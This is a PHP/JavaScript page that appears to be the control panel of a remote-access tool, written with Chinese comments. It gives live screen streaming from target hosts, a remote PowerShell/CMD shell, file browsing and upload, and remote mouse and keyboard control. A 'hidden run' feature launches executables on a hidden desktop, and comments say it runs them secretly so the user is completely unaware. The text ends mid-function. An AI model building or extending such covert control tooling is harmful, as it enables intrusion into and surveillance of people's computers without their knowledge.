<?php
defined('ABSPATH') || exit;
include WD_THEME_DIR . '/templates/partials/layout-open.php';
$host_id = (int)($_GET['host_id'] ?? 0);
?>

<!-- 终端模拟器，自己手搓的，没上 xterm.js -->
<!-- 不依赖任何外部 CDN，纯 HTML + CSS + JS 硬撸 -->

<style>
/* 整页布局，撑满屏幕不留白 */
.wd-screen-page {
    display: flex; flex-direction: column;
    height: calc(100vh - 60px); /* 减去 topbar */
    background: #111; color: #eee; font-family: sans-serif;
    overflow: hidden;
}
.wd-screen-header {
    display: flex; justify-content: space-between; align-items: center;
    padding: 8px 14px; background: #1a1a2e; border-bottom: 1px solid #333; flex-shrink: 0;
}
.wd-screen-title { display: flex; align-items: center; gap: 10px; font-size: 15px; font-weight: 600; }
.wd-screen-host-badge { background: #2a2a4a; padding: 2px 8px; border-radius: 4px; font-size: 13px; }
.wd-screen-controls { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
/* ── 主体：canvas 左 + 面板右 ── */
.wd-screen-layout { display: flex; flex: 1; overflow: hidden; }
.wd-screen-body {
    flex: 1; position: relative; display: flex;
    align-items: center; justify-content: center;
    overflow: hidden; background: #000;
}
#screen-canvas { max-width: 100%; max-height: 100%; display: block; }
.wd-screen-overlay {
    position: absolute; inset: 0; display: flex;
    align-items: center; justify-content: center; background: rgba(0,0,0,.85);
}
.wd-screen-placeholder { text-align: center; color: #aaa; }
.wd-spin { width: 38px; height: 38px; border: 4px solid #333; border-top-color: #4e9af1;
           border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
/* ── 右侧面板 ── */
.wd-side-panel {
    width: 420px; display: none; flex-direction: column;
    background: #0d0d0d; border-left: 1px solid #333; flex-shrink: 0;
}
.wd-side-panel.visible { display: flex; }
.wd-side-tabs { display: flex; background: #151520; border-bottom: 1px solid #333; flex-shrink: 0; overflow-x: auto; }
.wd-side-tab {
    flex: 1; background: transparent; color: #888; border: none;
    padding: 6px 4px; font-size: 11px; cursor: pointer; white-space: nowrap;
    border-bottom: 2px solid transparent;
}
.wd-side-tab.active  { color: #4e9af1; border-bottom-color: #4e9af1; }
.wd-side-tab:hover   { color: #ccc; }
.wd-stab-panel       { display: none; flex-direction: column; flex: 1; overflow: hidden; }
.wd-stab-panel.active{ display: flex; }
/* 终端标签页的样式 */
.wd-term-header {
    display: flex; justify-content: space-between; align-items: center;
    padding: 6px 10px; background: #1a1a2e; border-bottom: 1px solid #333;
    font-size: 13px; font-weight: 600; flex-shrink: 0;
}
/* 自己手写的终端模拟器容器 */
#termXterm {
    flex: 1; display: flex; flex-direction: column; overflow: hidden; background: #0d0d0d; min-height: 0;
}
#side-term-output {
    flex: 1; overflow-y: auto; padding: 8px 10px;
    background: #0d0d0d; color: #c8ffc8;
    font-family: 'Cascadia Code','Consolas','Courier New','NSimSun','SimSun',monospace;
    font-size: 12px; line-height: 1.5; white-space: pre-wrap; word-break: break-all; min-height: 0;
}
.side-term-input-bar {
    display: flex; align-items: center; gap: 6px;
    padding: 5px 8px; background: #111; border-top: 1px solid #333; flex-shrink: 0;
}
.side-term-prompt { color: #28c840; font-family: monospace; font-size: 12px; }
#side-term-input {
    flex: 1; background: transparent; border: none; color: #c8ffc8;
    font-family: 'Cascadia Code','Consolas','Courier New',monospace; font-size: 12px; outline: none;
}
/* 页脚状态栏，显示分辨率和 FPS 等信息 */
.wd-screen-footer {
    display: flex; gap: 20px; padding: 5px 14px;
    background: #1a1a2e; border-top: 1px solid #333;
    font-size: 11px; color: #888; flex-shrink: 0;
}
/* 各种按钮统一样式，省得一个个写 */
.sc-btn { cursor: pointer; border: none; border-radius: 4px; padding: 4px 10px; font-size: 12px; font-weight: 600; }
.sc-btn-sm { padding: 3px 8px; font-size: 11px; }
.sc-primary { background: #2980b9; color: #fff; }
.sc-danger   { background: #c0392b; color: #fff; }
.sc-ghost    { background: transparent; color: #aaa; border: 1px solid #555; }
.sc-success  { background: #27ae60; color: #fff; }
.sc-info     { background: #1abc9c; color: #fff; }
.sc-warning  { background: #e67e00; color: #fff; }
.sc-select { background: #222; color: #eee; border: 1px solid #555; border-radius: 4px; padding: 3px 6px; font-size: 12px; }
/* ── 远程控制模式 ── */
#screen-canvas.control-mode { cursor: crosshair; }
#ctrl-indicator {
    position: absolute; top: 8px; left: 50%; transform: translateX(-50%);
    background: rgba(231,76,60,0.85); color: #fff;
    padding: 3px 12px; border-radius: 12px; font-size: 11px; font-weight: 700;
    pointer-events: none; display: none; z-index: 10;
}
/* 键盘输入条，控制模式下用来打字和发快捷键 */
#ctrl-keyboard-bar {
    display: none; position: absolute; bottom: 0; left: 0; right: 0;
    background: rgba(15,15,30,0.92); border-top: 1px solid #e74c3c;
    padding: 6px 10px; gap: 6px; align-items: center; z-index: 20;
    flex-wrap: wrap;
}
#ctrl-keyboard-bar.visible { display: flex; }
#ctrl-type-input {
    flex: 1; min-width: 160px;
    background: rgba(255,255,255,0.08); color: #e0e0e0;
    border: 1px solid #e74c3c; border-radius: 4px;
    padding: 4px 8px; font-size: 13px; outline: none;
}
#ctrl-type-input::placeholder { color: #888; font-size: 12px; }
.ctrl-key-btn {
    background: rgba(255,255,255,0.1); color: #ddd;
    border: 1px solid #555; border-radius: 3px;
    padding: 3px 8px; font-size: 11px; cursor: pointer; white-space: nowrap;
}
.ctrl-key-btn:hover { background: rgba(231,76,60,0.4); border-color: #e74c3c; }
.ctrl-key-btn:active { background: rgba(231,76,60,0.7); }
/* 文件管理标签页，浏览和上传文件 */
.wd-file-bar {
    display: flex; gap: 4px; padding: 7px 8px;
    background: #1a1a2e; border-bottom: 1px solid #333; flex-shrink: 0;
}
.wd-file-path {
    flex: 1; background: #111; color: #dde; border: 1px solid #444;
    border-radius: 4px; padding: 3px 8px; font-size: 12px; outline: none;
}
.wd-file-path:focus { border-color: #4e9af1; }
.wd-file-shortcuts {
    display: flex; gap: 4px; padding: 5px 8px;
    border-bottom: 1px solid #222; flex-shrink: 0; flex-wrap: wrap;
}
.wd-file-sc {
    background: rgba(255,255,255,0.05); border: 1px solid #333;
    border-radius: 3px; padding: 1px 8px; font-size: 11px;
    color: #888; cursor: pointer;
}
.wd-file-sc:hover { background: rgba(78,154,241,0.2); color: #4e9af1; }
.wd-file-area {
    flex: 1; overflow-y: auto; padding: 6px 8px;
    font-family: 'Consolas','Courier New','NSimSun',monospace;
    font-size: 11px; color: #bbb;
}
.wd-file-upload-row {
    display: flex; gap: 6px; padding: 7px 8px;
    border-top: 1px solid #333; flex-shrink: 0;
    align-items: center;
}
.wd-file-upload-note { font-size: 10px; color: #666; flex: 1; }
</style>

<div class="wd-screen-page" id="screenPage">

  <!-- 顶栏 -->
  <div class="wd-screen-header">
    <div class="wd-screen-title">
      <span>📺 实时屏幕监控</span>
      <span class="wd-screen-host-badge" id="screen-host-badge" style="display:none"></span>
      <span id="screen-status" class="wd-badge">未连接</span>
    </div>
    <div class="wd-screen-controls">
      <select id="screen-host" class="sc-select" title="选择主机" aria-label="选择主机" onchange="onHostChange()">
        <option value="">选择主机...</option>
      </select>
      <button class="sc-btn sc-btn-sm sc-primary"  id="btn-screen-connect" disabled onclick="connectScreen()">▶ 连接</button>
      <button class="sc-btn sc-btn-sm sc-danger"   id="btn-screen-stop"    style="display:none" onclick="disconnectScreen()">■ 断开</button>
      <button class="sc-btn sc-btn-sm sc-info"     id="btn-terminal"       style="display:none" onclick="toggleTermPanel()">⌨️ 终端</button>
      <button class="sc-btn sc-btn-sm sc-warning"  id="btn-files"          style="display:none" onclick="openSideTab('files')">📁 文件</button>
      <button class="sc-btn sc-btn-sm sc-ghost"    id="btn-control"        style="display:none" onclick="toggleControlMode()">🖱 控制</button>
      <button class="sc-btn sc-btn-sm sc-ghost"    id="btn-hidden-app"     style="display:none" onclick="openHiddenAppPanel()" title="在用户不可见的隐藏桌面上运行程序">🕵️ 隐藏运行</button>
      <button class="sc-btn sc-btn-sm sc-ghost"    id="btn-fullscreen"     onclick="goFullscreen()">⛶ 全屏</button>
      <span class="wd-sm wd-muted" id="screen-fps"></span>
    </div>
  </div>

  <!-- 主体 -->
  <div class="wd-screen-layout">
    <!-- 画面区 -->
    <div class="wd-screen-body" id="screen-body">
      <canvas id="screen-canvas" tabindex="0"></canvas>
      <div id="ctrl-indicator">🖱 远程控制中 — 点击画面定位鼠标 | 下方输入框输入文字 | ESC 退出</div>

      <!-- 键盘输入条（控制模式下显示） -->
      <div id="ctrl-keyboard-bar">
        <input id="ctrl-type-input" type="text" placeholder="在此输入文字发送到目标机（支持中文/任意字符）" autocomplete="off" spellcheck="false">
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('Enter')" title="回车">↵ Enter</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('Backspace')" title="退格">⌫ 退格</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('Delete')" title="删除">Del</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('Tab')" title="Tab">⇥ Tab</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('Escape')" title="ESC">Esc</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('ArrowUp')" title="上">↑</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('ArrowDown')" title="下">↓</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('ArrowLeft')" title="左">←</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('ArrowRight')" title="右">→</button>
        <button class="ctrl-key-btn" onclick="ctrlSendCombo('a','ctrl')" title="全选">Ctrl+A</button>
        <button class="ctrl-key-btn" onclick="ctrlSendCombo('c','ctrl')" title="复制">Ctrl+C</button>
        <button class="ctrl-key-btn" onclick="ctrlSendCombo('v','ctrl')" title="粘贴">Ctrl+V</button>
        <button class="ctrl-key-btn" onclick="ctrlSendCombo('z','ctrl')" title="撤销">Ctrl+Z</button>
        <button class="ctrl-key-btn" onclick="ctrlSendCombo('x','ctrl')" title="剪切">Ctrl+X</button>
        <button class="ctrl-key-btn" onclick="ctrlSendCombo('F4','alt')" title="关闭窗口">Alt+F4</button>
        <button class="ctrl-key-btn" onclick="ctrlSendSpecial('F5')" title="刷新">F5</button>
        <button class="ctrl-key-btn" onclick="ctrlSendCombo('d','meta')" title="显示桌面">Win+D</button>
      </div>
      <div class="wd-screen-overlay" id="screen-overlay">
        <div class="wd-screen-placeholder">
          <div class="wd-spin" id="overlay-spin" style="display:none"></div>
          <p id="overlay-msg">选择主机后点击「连接」</p>
          <p style="font-size:12px;color:#666">仅观看模式</p>
        </div>
      </div>
    </div>

    <!-- 右侧面板，终端和文件管理器都在这 -->
    <div class="wd-side-panel" id="side-panel">
      <!-- 标签栏，切终端还是文件就看这里 -->
      <div class="wd-side-tabs">
        <button class="wd-side-tab active" data-stab="terminal" onclick="switchSideTab('terminal', this)">⌨️ 终端</button>
        <button class="wd-side-tab"        data-stab="files"    onclick="switchSideTab('files',    this)">📁 文件</button>
      </div>

      <!-- 终端 tab -->
      <div class="wd-stab-panel active" id="stab-terminal">
        <div class="wd-term-header">
          <span>交互式终端</span>
          <div style="display:flex;gap:6px;align-items:center">
            <select id="sel-shell" class="sc-select" title="选择终端类型" aria-label="选择终端类型">
              <option value="powershell">PowerShell</option>
              <option value="cmd">CMD</option>
            </select>
            <button class="sc-btn sc-btn-sm sc-success" onclick="termOpen()">▶ 新建</button>
            <button class="sc-btn sc-btn-sm sc-danger"  onclick="termClose()">✕</button>
          </div>
        </div>
        <div id="termXterm">
          <div id="side-term-output"></div>
          <div class="side-term-input-bar">
            <span class="side-term-prompt" id="side-term-prompt">PS&gt;</span>
            <input id="side-term-input" type="text" placeholder="输入命令，Enter 发送..." autocomplete="off" spellcheck="false">
          </div>
        </div>
      </div>

      <!-- 文件管理标签页，浏览、上传文件 -->
      <div class="wd-stab-panel" id="stab-files">
        <div class="wd-file-bar">
          <input id="file-path-input" class="wd-file-path" type="text" value="C:\" placeholder="目录路径…" autocomplete="off"/>
          <button class="sc-btn sc-btn-sm sc-primary" onclick="fileBrowse()">列出</button>
          <button class="sc-btn sc-btn-sm sc-ghost"   onclick="fileGoUp()">↑ 上级</button>
        </div>
        <div class="wd-file-shortcuts">
          <span class="wd-file-sc" onclick="fileJump('C:\\')">C:\</span>
          <span class="wd-file-sc" onclick="fileJump('C:\\Users')">用户</span>
          <span class="wd-file-sc" onclick="fileJump('C:\\Windows')">System</span>
          <span class="wd-file-sc" onclick="fileJump('C:\\Program Files')">程序</span>
          <span class="wd-file-sc" onclick="fileJump('%USERPROFILE%\\Desktop')">桌面</span>
          <span class="wd-file-sc" onclick="fileJump('%TEMP%')">Temp</span>
        </div>
        <div class="wd-file-area" id="file-area">
          <span style="color:#555">连接终端后点击「列出」浏览目录</span>
        </div>
        <div class="wd-file-upload-row">
          <input type="file" id="file-upload-input" style="display:none" onchange="fileUpload(this)"/>
          <button class="sc-btn sc-btn-sm sc-success" onclick="document.getElementById('file-upload-input').click()">⬆ 上传到此目录</button>
          <span class="wd-file-upload-note">文件将通过终端命令写入，限 200KB</span>
        </div>
      </div>
    </div>
  </div>

  <!-- 底部状态栏，显示分辨率、FPS 和主机信息 -->
  <div class="wd-screen-footer">
    <span id="screen-res">分辨率: —</span>
    <span id="screen-host-label">未连接</span>
    <span id="screen-fps-bar"></span>
  </div>
</div>

<script>
document.getElementById('wd-topbar-title').textContent = '实时屏幕监控';
const INIT_HOST = <?= $host_id ?>;

let screenWs = null, frameCount = 0, lastFpsTs = Date.now();
const canvas = document.getElementById('screen-canvas');
const ctx    = canvas.getContext('2d');

// 主机相关的逻辑都在这了，加载列表、切换回调
async function initHosts() {
    const res = await WD.ajax('wd_get_hosts', { page: 1, status: 'online' });
    if (!res.success) return;
    const sel = document.getElementById('screen-host');
    res.data.items.forEach(h => {
        const o = document.createElement('option');
        o.value = h.id;
        o.textContent = h.name + ' (' + h.ip_last + ')';
        o.dataset.name = h.name;
        if (h.id == INIT_HOST) o.selected = true;
        sel.appendChild(o);
    });
    if (sel.value) {
        document.getElementById('btn-screen-connect').disabled = false;
        if (INIT_HOST) connectScreen();
    }
}
function onHostChange() {
    document.getElementById('btn-screen-connect').disabled =
        !document.getElementById('screen-host').value;
}

// 屏幕监控，核心功能，画质嘛...能看清就行
async function connectScreen() {
    const sel    = document.getElementById('screen-host');
    const hostId = sel.value;
    if (!hostId) return;
    const hostName = sel.selectedOptions[0]?.dataset.name || '';

    const tr = await WD.ajax('wd_get_ws_token', { host_id: hostId }, 'POST');
    if (!tr.success) return WD.toast('获取 Token 失败', 'error');

    const wsProto = location.protocol === 'https:' ? 'wss://' : 'ws://';
    const wsBase  = (WD.ws_host || location.hostname + ':8765').replace(/^wss?:\/\//i, '');
    screenWs = new WebSocket(`${wsProto}${wsBase}/screen?role=browser&host_id=${hostId}&token=${encodeURIComponent(tr.data.token)}`);
    screenWs.binaryType = 'arraybuffer';

    setStatus('连接中...', 'yellow');
    document.getElementById('overlay-spin').style.display = '';
    document.getElementById('overlay-msg').textContent = '正在连接到 ' + hostName + '...';

    screenWs.onopen = () => {
        setStatus('直播中', 'green');
        document.getElementById('btn-screen-connect').style.display = 'none';
        document.getElementById('btn-screen-stop').style.display    = '';
        document.getElementById('btn-terminal').style.display       = '';
        document.getElementById('btn-files').style.display          = '';
        document.getElementById('btn-control').style.display        = '';
        document.getElementById('btn-hidden-app').style.display     = '';
        document.getElementById('screen-overlay').style.display     = 'none';
        document.getElementById('screen-host-label').textContent    = hostName;
        document.getElementById('screen-host-badge').textContent    = hostName;
        document.getElementById('screen-host-badge').style.display  = '';
    };
    screenWs.onmessage = (e) => {
        // 文本消息：可能是文件浏览器响应（list_dir_result 等）
        if (typeof e.data === 'string') {
            _handleScreenTextMsg(e.data);
            return;
        }
        // 二进制消息：JPEG 帧
        const blob = new Blob([e.data], { type: 'image/jpeg' });
        const url  = URL.createObjectURL(blob);
        const img  = new Image();
        img.onload = () => {
            if (canvas.width  !== img.width)  canvas.width  = img.width;
            if (canvas.height !== img.height) canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
            URL.revokeObjectURL(url);
            document.getElementById('screen-res').textContent = '分辨率: ' + img.width + '×' + img.height;
            frameCount++;
            const now = Date.now();
            if (now - lastFpsTs >= 1000) {
                document.getElementById('screen-fps-bar').textContent = 'FPS: ' + frameCount;
                document.getElementById('screen-fps').textContent     = frameCount + ' fps';
                frameCount = 0; lastFpsTs = now;
            }
        };
        img.src = url;
    };
    screenWs.onerror = () => setStatus('连接错误', 'red');
    screenWs.onclose = () => {
        setStatus('已断开', 'gray');
        document.getElementById('btn-screen-connect').style.display = '';
        document.getElementById('btn-screen-stop').style.display    = 'none';
        document.getElementById('btn-terminal').style.display       = 'none';
        document.getElementById('btn-files').style.display          = 'none';
        document.getElementById('btn-control').style.display        = 'none';
        document.getElementById('btn-hidden-app').style.display     = 'none';
        document.getElementById('screen-host-badge').style.display  = 'none';
        document.getElementById('screen-overlay').style.display     = 'flex';
        document.getElementById('overlay-spin').style.display       = 'none';
        document.getElementById('overlay-msg').textContent          = '连接已断开，请重新连接';
        exitControlMode();
        closeSidePanel();
    };
}
function disconnectScreen() {
    if (screenWs) { screenWs.close(); screenWs = null; }
    closeSidePanel();
}
function setStatus(t, c) {
    const el = document.getElementById('screen-status');
    el.textContent = t;
    el.className   = 'wd-badge wd-badge--' + c;
}
function goFullscreen() {
    const el = document.getElementById('screenPage');
    if (el.requestFullscreen) el.requestFullscreen();
}

// 右侧面板开关逻辑，点按钮展开或收起
function toggleTermPanel() {
    const p = document.getElementById('side-panel');
    p.classList.contains('visible') ? closeSidePanel() : openSidePanel();
}
function openSidePanel() {
    document.getElementById('side-panel').classList.add('visible');
}
function closeSidePanel() {
    document.getElementById('side-panel').classList.remove('visible');
    termClose();
}

// 标签切换交给 button 里的 onclick 去调 switchSideTab 就行了

// 自己手写的终端模拟器，没引用 xterm.js，主打一个零依赖
let termWs = null;
const sideOut   = document.getElementById('side-term-output');
const sideInEl  = document.getElementById('side-term-input');
let sideHistory = [], sideHistIdx = -1;

function sideProcessOutput(s) {
    let r = s.replace(/\r\n/g, '\n');
    r = r.replace(/\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g, '');
    r = r.replace(/[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f]/g, '');
    r = r.replace(/\r/g, '\n');
    return r;
}

const sideTerm = {
    write(s) {
        const clean = sideProcessOutput(s); if (clean === '') return;
        sideOut.appendChild(document.createTextNode(clean));
        sideOut.scrollTop = sideOut.scrollHeight;
    },
    writeln(s) { this.write(sideProcessOutput(s) + '\n'); },
    clear()    { sideOut.innerHTML = ''; },
    focus()    { sideInEl.focus(); },
    onData()   {}, onResize() {},
    cols: 180, rows: 40,
};

// 切换 shell 类型时顺便把提示符也改了
document.getElementById('sel-shell').addEventListener('change', function() {
    document.getElementById('side-term-prompt').textContent = this.value === 'powershell' ? 'PS>' : 'CMD>';
});

// 敲 Enter 发命令，按 ↑↓ 翻历史记录
sideInEl.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        const cmd = sideInEl.value; if (!cmd.trim()) return;
        if (!termWs || termWs.readyState !== WebSocket.OPEN)
            return WD.toast('请先在屏幕页连接主机并打开终端', 'error');
        sideHistory.unshift(cmd); if (sideHistory.length > 50) sideHistory.pop();
        sideHistIdx = -1;
        termWs.send(JSON.stringify({ type: 'input', data: cmd + '\r\n' }));
        sideInEl.value = '';
    } else if (e.key === 'ArrowUp') {
        sideHistIdx = Math.min(sideHistIdx + 1, sideHistory.length - 1);
        sideInEl.value = sideHistory[sideHistIdx] || ''; e.preventDefault();
    } else if (e.key === 'ArrowDown') {
        sideHistIdx = Math.max(sideHistIdx - 1, -1);
        sideInEl.value = sideHistIdx < 0 ? '' : (sideHistory[sideHistIdx] || ''); e.preventDefault();
    }
});

async function termOpen() {
    const hostId = document.getElementById('screen-host').value;
    if (!hostId) return WD.toast('请先连接主机', 'error');
    if (termWs) termClose();

    const shell   = document.getElementById('sel-shell').value;
    const session = 'scr-' + Date.now();
    const tr = await WD.ajax('wd_get_ws_token', { host_id: hostId }, 'POST');
    if (!tr.success) return WD.toast('获取 Token 失败', 'error');

    const wsProto = location.protocol === 'https:' ? 'wss://' : 'ws://';
    const wsBase  = (WD.ws_host || location.hostname + ':8765').replace(/^wss?:\/\//i, '');
    termWs = new WebSocket(`${wsProto}${wsBase}/shell?role=browser&host_id=${hostId}&session=${session}&shell=${shell}&token=${encodeURIComponent(tr.data.token)}`);

    termWs.onopen = () => {
        const hostName = document.getElementById('screen-host').selectedOptions[0]?.dataset.name || hostId;
        sideTerm.writeln('[已连接到 ' + hostName + ' - ' + (shell === 'powershell' ? 'PowerShell' : 'CMD') + ']');
        termWs.send(JSON.stringify({ type: 'resize', rows: sideTerm.rows, cols: sideTerm.cols }));
        sideInEl.focus();
    };
    termWs.onmessage = (e) => {
        try {
            const msg = JSON.parse(e.data);
            if (msg.type === 'output') sideTerm.write(msg.data);
        } catch { sideTerm.write(e.data); }
    };
    termWs.onerror = () => sideTerm.writeln('[连接错误]');
    termWs.onclose = () => sideTerm.writeln('[终端已关闭]');
}

function termSend() {
    // 给文件管理那些地方留的接口，外部也能调 termSend
    const cmd = arguments[0] || '';
    if (termWs && termWs.readyState === WebSocket.OPEN)
        termWs.send(JSON.stringify({ type: 'input', data: cmd + '\r\n' }));
}

function termClose() {
    if (termWs) { termWs.close(); termWs = null; }
}

initHosts();
window.addEventListener('beforeunload', () => {
    if (screenWs) screenWs.close();
    termClose();
    hdClose();
});

// 隐藏桌面应用，在目标机后台偷偷跑程序，用户完全不知情
let hdWs = null;
const hdCanvas = document.getElementById('hd-canvas');
const hdCtx    = hdCanvas ? hdCanvas.getContext('2d') : null;

function openHiddenAppPanel() {
    document.getElementById('hd-panel').style.display = 'flex';
}
function closeHiddenAppPanel() {
    document.getElementById('hd-panel').style.display = 'none';
    hdClose();
}

// ── 文件浏览器（通过 screen WS 实时请求） ──────────────────────────────
let _fbReqId = 0;
const _fbCallbacks = {};

function _fbRequest(type, params) {
    return new Promise((resolve, reject) => {
        if (!screenWs || screenWs.readyState !== WebSocket.OPEN) {
            return reject('屏幕未连接，请先打开屏幕监控');
        }
        const req_id = 'fb_' + (++_fbReqId);
        _fbCallbacks[req_id] = resolve;
        setTimeout(() => {
            if (_fbCallbacks[req_id]) {
                delete _fbCallbacks[req_id];
                reject('请求超时');
            }
        }, 8000);
        screenWs.send(JSON.stringify({ ...params, type, req_id }));
    });
}

// 注入到现有 screenWs 消息处理链：检测 list_dir_result / list_drives_result
const _origScreenMsg = window._screenWsMsgHandler;
function _handleScreenTextMsg(text) {
    try {
        const d = JSON.parse(text);
        if ((d.type === 'list_dir_result' || d.type === 'list_drives_result') && d.req_id) {
            const cb = _fbCallbacks[d.req_id];
            if (cb) { delete _fbCallbacks[d.req_id]; cb(d); }
            return true;
        }
    } catch (_) {}
    return false;
}

// ── 文件浏览器 UI ──────────────────────────────────────────────────────
let _fbCurrentPath = 'C:\\';
let _fbSelectedExe = '';

async function openFileBrowser() {
    document.getElementById('fb-modal').style.display = 'flex';
    document.getElementById('fb-selected').textContent = '（未选择）';
    _fbSelectedExe = '';
    await fbLoadDrives();
}
function closeFileBrowser() {
    document.getElementById('fb-modal').style.display = 'none';
}
function fbConfirmSelect() {
    if (!_fbSelectedExe) return WD.toast('请先点击一个 EXE 文件', 'error');
    document.getElementById('hd-exe-path').value = _fbSelectedExe;
    closeFileBrowser();
}

async function fbLoadDrives() {
    fbSetStatus('加载驱动器...');
    try {
        const r = await _fbRequest('list_drives', {});
        const list = document.getElementById('fb-list');
        list.innerHTML = '';
        (r.drives || []).forEach(d => {
            const row = document.createElement('div');
            row.className = 'fb-row fb-dir';
            const free = d.free ? ' — 剩余 ' + _fbFmtSize(d.free) : '';
            row.innerHTML = `<span class="fb-icon">💾</span><span class="fb-name">${d.letter}: (${d.type}${free})</span>`;
            row.onclick = () => fbNavigate(d.root);
            list.appendChild(row);
        });
        document.getElementById('fb-breadcrumb').textContent = '此电脑';
        fbSetStatus('');
    } catch (e) { fbSetStatus('❌ ' + e); }
}

async function fbNavigate(path) {
    _fbCurrentPath = path;
    fbSetStatus('加载中...');
    try {
        const r = await _fbRequest('list_dir', { path });
        const list = document.getElementById('fb-list');
        list.innerHTML = '';
        // 先放一个「上级目录」的入口
        const upPath = path.replace(/[\\/][^\\/]*[\\/]?$/, '') || '';
        if (upPath && upPath !== path) {
            const up = document.createElement('div');
            up.className = 'fb-row fb-dir';
            up.innerHTML = '<span class="fb-icon">⬆️</span><span class="fb-name">..</span>';
            up.onclick = () => fbNavigate(upPath + '\\');
            list.appendChild(up);
        } else {
            const up = document.createElement('div');
            up.className = 'fb-row fb-dir';
            up.innerHTML = '<span class="fb-icon">🏠</span><span class="fb-name">此电脑</span>';
            up.onclick = () => fbLoadDrives();
            list.appendChild(up);
        }
        // 遍历目录和文件，文件夹可点进去，EXE 可选中
        (r.items || []).forEach(item => {
            if (item.error) return;
            const row = document.createElement('div');
            const isDir = item.type === 'dir';
            const isExe = !isDir && item.name.toLowerCase().endsWith('.exe');
            if (!isDir && !isExe) return; // 非目录、非 EXE 的一律不显示，省得列表太长
            row.className = 'fb-row ' + (isDir ? 'fb-dir' : 'fb-exe');
            const icon = isDir ? '📁' : '⚙️';
            row.innerHTML = `<span class="fb-icon">${icon}</span><span class="fb-name">${item.name}</span>`;
            if (isDir) {
                row.onclick = () => fbNavigate(path.replace(/[\\/]$/, '') + '\\' + item.name);
            } else {
                row.onclick = () => {
                    _fbSelectedExe = path.replace(/[\\/]$/, '') + '\\' + item.name;
                    document.getElementById('fb-selected').textContent = _fbSelectedExe;
                    list.querySelectorAll('.fb-exe').forEach(r2 => r2.classList.remove('selected'));
                    row.classList.add('selected');
                };
                row.ondblclick = () => {
                    _fbSelectedExe = path.replace(/[\\/]$/, '') + '\\' + item.name;
                    fbConfirmSelect();
                };
            }
            list.appendChild(row);
        });
        // 更新面包屑
        document.getElementById('fb-breadcrumb').textContent = path;
        fbSetStatus('');
        if (!r.items || r.items.length === 0) fbSetStatus('（空目录）');
    } catch (e) { fbSetStatus('❌ ' + e); }
}

function fbSetStatus(msg) {
    const el = document.getElementById('fb-status');
    if (el) el.textContent = msg;
}
function _fbFmtSize(b) {
    if (b > 1e9) return (b/1e9).toFixed(1) + ' GB';
    if (b > 1e6) return (b/1e6).toFixed(1) + ' MB';
    return (b/1024).toFixed(0) + ' KB';
}

// 隐藏桌面启动：直接用 /hidden 这个 WebSocket 通道，不走 HTTP 队列，延迟最低
async function hdLaunch() {
    const hostId = document.getElementById('screen-host').value;
    if (!hostId) return WD.toast('请先连接主机', 'error');
    const exePath = document.getElementById('hd-exe-path').value.trim();
    if (!exePath) return WD.toast('请输入或选择 EXE 路径', 'error');

    hdStatus('连接中...', '#e3b341');
    hdClose();

    const tr = await WD.ajax('wd_get_ws_token', { host_id: hostId }, 'POST');
    if (!tr.success) return WD.toast('获取 Token 失败', 'error');

    const wsProto = location.protocol === 'https:' ? 'wss://' : 'ws://';
    const wsBase  = (WD.ws_host || location.hostname + ':8765').replace(/^wss?:\/\//i, '');
    hdWs = new WebSocket(`${wsProto}${wsBase}/hidden?role=browser&host_id=${hostId}&token=${encodeURIComponent(tr.data.token)}`);
    hdWs.binaryType = 'arraybuffer';

    let _hdLaunchPath = exePath;   // 先存着路径，等 agent 说「我准备好了」再发
    let _hdLaunched   = false;

    // 超时保护：15 秒内 agent 还没就绪就报错，不干等
    const _hdReadyTimeout = setTimeout(() => {
        if (!_hdLaunched) {
            hdStatus('❌ 超时：Agent 未响应', '#f85149');
            WD.toast('Agent 未在 15 秒内就绪，请检查客户端连接', 'error');
            hdClose();
        }
    }, 15000);

    hdWs.onopen = () => {
        // 不立即发 launch —— 等 agent 连接好 /hidden 后，
        // 中继会推送 agent_ready，届时再发，避免竞态导致消息丢失
        hdStatus('等待 Agent 就绪...', '#e3b341');
    };

    hdWs.onmessage = (e) => {
        // 文本消息就是 JSON，解析一下看是啥响应
        if (typeof e.data === 'string') {
            try {
                const d = JSON.parse(e.data);
                if (d.type === 'agent_ready' && !_hdLaunched) {
                    // Agent /hidden WS 就绪，现在发 launch
                    clearTimeout(_hdReadyTimeout);
                    _hdLaunched = true;
                    hdWs.send(JSON.stringify({ type: 'launch', path: _hdLaunchPath }));
                    hdStatus('正在启动...', '#e3b341');
                } else if (d.type === 'launch_result') {
                    if (d.success) {
                        hdStatus('直播中 ✓', '#3fb950');
                        document.getElementById('hd-stop-btn').style.display = '';
                        document.getElementById('hd-launch-btn').style.display = 'none';
                        document.getElementById('hd-stream-area').style.display = '';
                    } else {
                        hdStatus('❌ ' + d.message, '#f85149');
                        WD.toast('隐藏启动失败：' + d.message, 'error');
                        hdClose();
                    }
                }
            } catch (_) {}
            return;
        }
        // 二进制消息就是 JPEG 画面，直接渲染
        const blob = new Blob([e.data], { type: 'image/jpeg' });
        const url  = URL.createObjectURL(blob);
        const img  = new Image();
        img.onload = () => {
            if (hdCanvas.width  !== img.width)  hdCanvas.width  = img.width;
            if (hdCanvas.height !== img.height) hdCanvas.height = img.height;
            if (hdCtx) hdCtx.drawImage(img, 0, 0);
            URL.revokeObjectURL(url);
        };
        img.src = url;
    };

    hdWs.onclose = () => {
        hdStatus('已断开', '#7d8590');
        document.getElementById('hd-stop-btn').style.display  = 'none';
        document.getElementById('hd-launch-btn').style.display = '';
        document.getElementById('hd-stream-area').style.display = 'none';
        hdWs = null;
    };
    hdWs.onerror = () => WD.toast('隐藏桌面 WebSocket 连接失败', 'error');
}

function hdStatus(msg, color) {
